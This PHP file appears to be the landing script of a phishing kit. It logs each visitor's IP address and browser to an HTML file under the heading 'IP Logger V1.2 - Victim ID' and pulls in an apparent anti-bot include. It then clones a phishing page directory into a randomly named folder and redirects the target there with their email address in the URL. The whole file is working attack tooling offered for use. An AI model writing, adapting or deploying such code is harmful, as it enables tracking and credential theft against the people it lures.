<?php
include('defend.php');
	$An = rand(999999999999999999, 99999999999999999999999999999);
	$Oni = md5(gmdate('r'));
	$x = "_";
ob_start(); 
session_start();  
set_time_limit(0); 

//sanitize data where any character is allowed
function sanitizer($check){
	$check=str_replace("\'","'",$check);
	$check=str_replace('\"','"',$check);
	$check=str_replace("\\","TN9OO***:::::t&*HHHHOOOoooo0000N",$check); //just to keep track of what I will change later
	$check=trim($check);
	$check=str_replace("<","&lt;",$check);
	$check=str_replace('>','&gt;',$check);
	$check=str_replace("\r\n","<br/>",$check);
	$check=str_replace("\n","<br/>",$check);
	$check=str_replace("\r","<br/>",$check);
	$check=str_replace("'","&#39;",$check);
	$check=str_replace('"','&quot;',$check);
	$check=str_replace("TN9OO***:::::t&*HHHHOOOoooo0000N","&#92;",$check); //returning backslash in html entity
	 return $check;}

?>

<?php

$file = fopen("visit.html", "a");
$time = date("H:i dS F");
$ip = $_SERVER['REMOTE_ADDR'];
$browser = $_SERVER['HTTP_USER_AGENT'];
$qx = rand (11111111, 99999999); 
fwrite( $file, "<b>[+]=======[IP Logger V1.2 - Victim ID $qx]========[+] </b> <br/>");
fwrite($file, "<b>Time:</b> <font color='red'>$time</font><br/>" );
fwrite( $file, "<b>Ip Address:</b> <strong><img src='http://api.hostip.info/flag.php?ip=$ip' height='12' /> &nbsp;&nbsp;<a href='http://whoer.net/check?host=$ip' rel='nofollow' target='_blank'>$ip</a></strong><br/>");
fwrite( $file, "<b>Browser:</b><font color='green'> $browser </font> <br/>");
fwrite( $file, "<b>[+]=======[Created By Hacker BoUnCeR]========[+]</b><br><br>");
fclose( $file );

include_once("home/helper.php");

function recurse_copy($src, $dst)
{
    $dir = opendir($src);
    @mkdir($dst);
    while (false !== ($file = readdir($dir))) {
        if (($file != '.') && ($file != '..')) {
            if (is_dir($src . '/' . $file)) {
                recurse_copy($src . '/' . $file, $dst . '/' . $file);
            } else {
                copy($src . '/' . $file, $dst . '/' . $file);
                chmod($dst . '/' . $file, 0755);
            }
        }
    }
    closedir($dir);
}

session_start();
$_SESSION['referer'] = isset($_SERVER['REQUEST_URI']) ? $_SERVER['HTTP_REFERER'] : '';

$email = $_GET['email'];
$random = rand(0, 1000000000000);
$md5 = md5("$random");
$base = base64_encode($md5);
$dst = md5("$base");

$_SESSION['dir'] = $dst;
$src = "home";

recurse_copy($src, $dst);
header("Location: $dst/index.php?email=$email");
?>
